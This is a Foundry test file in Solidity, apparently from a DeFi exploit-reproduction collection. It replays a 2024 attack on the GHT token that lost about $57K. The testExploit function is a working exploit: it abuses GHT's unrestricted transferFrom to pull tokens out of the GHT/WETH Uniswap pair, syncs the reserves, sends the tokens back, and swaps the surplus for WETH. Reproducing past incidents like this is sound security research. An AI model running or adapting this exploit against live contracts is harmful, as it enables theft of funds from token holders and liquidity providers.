// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$57K
// Attacker : https://etherscan.io/address/0x096f0f03e4be68d7e6dd39b22a3846b8ce9849a3
// Attack Contract : https://etherscan.io/address/0xcc5159b5538268f45afda7b5756fa8769ce3e21f
// Vuln Contract : https://etherscan.io/address/0x528e046acfb52bd3f9c400e7a5c79a8a2c2863d0
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/19380954?line=3
interface IGHT {
    function transferFrom(address, address, uint256) external;
    function balanceOf(
        address
    ) external view returns (uint256);
}

contract ContractTest is Test {
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IGHT private constant GHT = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
    Uni_Pair_V2 private constant WETH_GHT = Uni_Pair_V2(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);

    // NOTE: the original DeFiHackLabs test forked by the attack tx hash
    // (0xd17266bcdf30cbcbd7d0b5a006f43141981aeee2e1f860f68c9a1805ecacbc68, block
    // 19380955, tx index 22) because the GHT/WETH pair received its liquidity from
    // OTHER same-block transactions (indices 0-21) before the attacker's tx - a plain
    // block-number fork one block earlier (19380954) sees the pair with zero GHT
    // balance (liquidity not added yet). anvil_state.json was captured via
    // vm.dumpState() at the exact intra-block pre-attack point (see
    // scripts poc-configs work for 2024-03-GHT), so offline replay only needs to
    // fork at the snapshot's own block (19380955); no txHash resolution needed here.
    function setUp() public {
        vm.createSelectFork(
        "http://127.0.0.1:8545", uint256(19380955)
        );
        vm.label(address(WETH), "WETH");
        vm.label(address(GHT), "GHT");
        vm.label(address(WETH_GHT), "WETH_GHT");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
        uint256 amount = GHT.balanceOf(address(WETH_GHT));
        GHT.transferFrom(address(WETH_GHT), address(GHT), amount - 1);
        WETH_GHT.sync();
        amount = GHT.balanceOf(address(GHT));
        GHT.transferFrom(address(GHT), address(WETH_GHT), amount);
        uint256 balance = GHT.balanceOf(address(WETH_GHT));
        (uint256 reserveIn, uint256 reserveOut,) = WETH_GHT.getReserves();
        uint256 amountIn = balance - reserveIn;
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        WETH_GHT.swap(0, amountOut, address(this), "");
        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }
}
